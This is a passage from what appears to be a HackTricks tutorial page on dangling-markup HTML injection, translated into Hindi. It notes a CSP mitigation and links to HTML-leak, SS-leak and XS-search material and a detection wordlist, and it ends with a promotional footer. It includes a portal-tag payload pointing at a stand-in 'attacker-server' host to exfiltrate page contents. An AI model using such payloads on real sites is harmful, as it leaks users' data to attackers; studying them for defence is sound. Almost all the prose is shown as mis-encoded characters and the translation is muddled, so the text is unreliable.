рдЗрд╕реЗ **рдПрдХ CSP** рдХреЗ рд╕рд╛рде **рдЯрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ **http-equiv** рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рд╣реИ (`Content-Security-Policy: default-src 'self';`, рдпрд╛ `Content-Security-Policy: http-equiv 'self';`)

### рдирдпрд╛ \<portal HTML рдЯреИрдЧ

рдЖрдк \<portal рдЯреИрдЧ рдХреЗ рдЙрджрд╛рд╣рд░рдгреАрдп рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдкрд░ рдПрдХ рдмрд╣реБрдд **рд░реЛрдЪрдХ рд╢реЛрдз** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ [рдпрд╣рд╛рдБ](https://research.securitum.com/security-analysis-of-portal-element/)ред\
рдЗрд╕ рд▓реЗрдЦрди рдХреЗ рд╕рдордп рдкрд░ рдЖрдкрдХреЛ Chrome рдореЗрдВ рдкреЛрд░реНрдЯрд▓ рдЯреИрдЧ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рд╣реЛрдЧрд╛ `chrome://flags/#enable-portals` рдЕрдиреНрдпрдерд╛ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред

```html
<portal src='https://attacker-server?
```

### HTML рд▓реАрдХреНрд╕

HTML рдореЗрдВ рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд╕рднреА рддрд░реАрдХреЗ Dangling Markup рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдХрднреА-рдХрднреА рдпрд╣ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣рд╛рдВ рдЪреЗрдХ рдХрд░реЗрдВ: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-рд▓реАрдХреНрд╕

рдпрд╣ **рдбреИрдВрдЧрд▓рд┐рдВрдЧ рдорд╛рд░реНрдХрдЕрдк рдФрд░ XS-рд▓реАрдХреНрд╕** рдХреЗ рдмреАрдЪ **рдорд┐рд╢реНрд░рдг** рд╣реИред рдПрдХ рдУрд░ рдпрд╣ рд╡рд┐рдХрд▓реНрдк рд╣рдореЗрдВ **HTML рдЗрдВрдЬреЗрдХреНрд╢рди** (рд▓реЗрдХрд┐рди рдирд╣реАрдВ JS) рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рд╣рдорд╛рд░реЗ рд╣рдорд▓реЗ рдХреА рдЬрдбрд╝ рд╕реЗ **рд╕рдорд╛рди рдореВрд▓** рдХреА рдкреГрд╖реНрда рдХреЛред рджреВрд╕рд░реА рдУрд░ рд╣рдо рд╡рд╣рд╛рдБ **рд╣рдо HTML рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЙрд╕ рдкреГрд╖реНрда рдкрд░ **рд╣рдорд▓рд╛** рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ, рдЬрд╣рд╛рдБ рд╣рдо HTML рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-рд╕рд░реНрдЪ/XS-рд▓реАрдХреНрд╕

XS-рд╕рд░реНрдЪ **рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ **рд╕рд╛рдЗрдб рдЪреИрдирд▓ рд╣рдорд▓реЛрдВ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдиреНрдореБрдЦ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрд╣ Dangling Markup рд╕реЗ рдПрдХ рднрд┐рдиреНрди рддрдХрдиреАрдХ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рддрдХрдиреАрдХреЛрдВ рдореЗрдВ HTML рдЯреИрдЧреЛрдВ рдХрд╛ рд╕рдорд╛рд╡реЗрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (JS рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд╕рд╛рде рдФрд░ рдмрд┐рдирд╛), рдЬреИрд╕реЗ [**CSS рдЗрдВрдЬреЗрдХреНрд╢рди**](../xs-search/#css-injection) рдпрд╛ [**Lazy Load Images**](../xs-search/#image-lazy-loading)**ред**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдбрд┐рдЯреЗрдХреНрд╢рди рд╕реВрдЪреА

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## рд╕рдВрджрд░реНрдн

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
